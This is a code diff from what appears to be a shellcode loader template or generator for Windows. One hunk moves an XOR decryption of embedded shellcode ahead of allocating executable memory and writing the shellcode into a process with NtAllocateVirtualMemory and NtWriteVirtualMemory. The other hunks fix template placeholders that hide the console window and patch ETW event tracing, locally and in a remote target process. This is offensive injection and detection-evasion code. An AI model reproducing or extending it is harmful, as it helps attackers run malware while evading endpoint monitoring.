@@ -311,12 +311,12 @@ void run() {
 
         PVOID lbuffer = nullptr;
         HANDLE curproc = GetCurrentProcess();
+        
+        // --- Decrypt Shellcode ---
+        XOR((char*)shellcode, shellcode_len, key, sizeof(key));
 
         // Allocate memory with permissions RW
         NtAllocateVirtualMemory(curproc, &lbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-
-        // --- Decrypt Shellcode ---
-        XOR((char*)shellcode, shellcode_len, key, sizeof(key));
 
         // Write code into memory
         NtWriteVirtualMemory(curproc, lbuffer, shellcode, shellcode_len, nullptr);
@@ -525,7 +525,7 @@ int main(int argc, char** argv) {
         //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
         HANDLE target = getHandle(PID);
         //PATCHETWREPLACEpatchETW();
-        //PATCHETWREMOTEREPLACEpatchETWRemote(target)
+        //PATCHETWREMOTEREPLACEpatchETWRemote(target);
         run(target);
 
 }
@@ -798,7 +798,7 @@ int main() {
         //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
         HANDLE target = getHandle(PID);
         //PATCHETWREPLACEpatchETW();
-        //PATCHETWREMOTEREPLACEpatchETWRemote(target)
+        //PATCHETWREMOTEREPLACEpatchETWRemote(target);
         run();
 
 }
@@ -1009,7 +1009,7 @@ int main(int argc, char** argv) {
         //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
         HANDLE target = getHandle(PID);
         //PATCHETWREPLACEpatchETW();
-        //PATCHETWREMOTEREPLACEpatchETWRemote(target)
+        //PATCHETWREMOTEREPLACEpatchETWRemote(target);
         run(target, PID);
         
 }
@@ -1220,7 +1220,7 @@ int main(int argc, char** argv) {
         //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
         HANDLE target = getHandle(PID);
         //PATCHETWREPLACEpatchETW();
-        //PATCHETWREMOTEREPLACEpatchETWRemote(target)
+        //PATCHETWREMOTEREPLACEpatchETWRemote(target);
         run(target, PID);
 
 }
